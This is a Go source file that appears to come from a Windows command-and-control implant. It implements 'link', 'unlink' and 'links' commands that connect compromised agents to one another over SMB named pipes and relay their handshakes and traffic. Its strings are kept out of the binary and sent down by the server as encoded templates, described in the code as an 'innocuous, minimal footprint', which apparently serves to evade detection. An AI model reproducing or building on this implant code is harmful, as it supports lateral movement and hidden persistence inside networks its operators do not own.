//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"time"
)

// LinkTemplate matches the server's CommandTemplate structure
type LinkTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxLinkProtoSmb     = 120
	idxLinkUncSlashes   = 122
	idxLinkPipePath     = 123
	idxLinkLocalhost    = 124
	idxLinkLoopback     = 125
	idxLinkStatusPrefix = 127
	idxLinkPingMarker   = 128
	idxLinkQuitMarker   = 129
	idxLinkDot          = 132
)

// Single-char byte arrays (innocuous, minimal footprint)
var (
	lnkPipe = string([]byte{0x7c}) // |
)

// LinkCommand handles the 'link' command for connecting to other SMB agents
type LinkCommand struct {
	tpl *LinkTemplate
}

// getTpl safely retrieves a template string by index
func (c *LinkCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &LinkTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store template for link_manager.go to use
	if c.tpl.Templates != nil {
		SetLinkManagerTemplate(c.tpl.Templates)
	}

	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case c.getTpl(idxLinkProtoSmb):
		if len(args) < 3 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		pipeName := args[2]

		// Build the full UNC pipe path
		// Handle localhost specially - use "." for local machine
		if strings.ToLower(targetHost) == c.getTpl(idxLinkLocalhost) || targetHost == c.getTpl(idxLinkLoopback) {
			targetHost = c.getTpl(idxLinkDot)
		}

		pipePath := c.getTpl(idxLinkUncSlashes) + targetHost + c.getTpl(idxLinkPipePath) + pipeName
		return c.linkSMB(pipePath)

	default:
		return CommandResult{
			Output:      ErrCtx(E29, protocol),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link
	routingID, err := lm.Link(pipePath)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E30, pipePath),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	// This avoids waiting for the next poll cycle
	handshakeResult := c.performImmediateHandshake(lm, routingID)

	statusPrefix := c.getTpl(idxLinkStatusPrefix)
	return CommandResult{
		Output:      statusPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
// instead of waiting for the next poll cycle
func (c *LinkCommand) performImmediateHandshake(lm *LinkManager, routingID string) string {
	// Wait briefly for the SMB agent's handshake to arrive in the handshake queue
	// The handleIncomingData goroutine should receive it shortly after connection
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *LinkDataOut
	for time.Now().Before(deadline) {
		// Check handshake queue for handshake data (sent via "lh" field)
		data := lm.GetHandshakeData()
		if data != nil && data.RoutingID == routingID {
			handshakeData = data
			break
		}
		// Re-queue any handshake that wasn't for us
		if data != nil {
			lm.queueHandshakeData(data)
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		return c.getTpl(idxLinkPingMarker)
	}

	// Queue the handshake data to be sent via "lh" field on next response to parent
	lm.queueHandshakeData(handshakeData)
	return c.getTpl(idxLinkQuitMarker)
}

// UnlinkCommand handles the 'unlink' command for disconnecting from SMB agents
type UnlinkCommand struct{}

func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := GetLinkManager()

	if err := lm.Unlink(routingID); err != nil {
		return CommandResult{
			Output:      ErrCtx(E31, routingID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S7, routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// LinksCommand handles the 'links' command for listing active SMB links
type LinksCommand struct{}

func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	lm := GetLinkManager()
	output := lm.ListLinks()

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
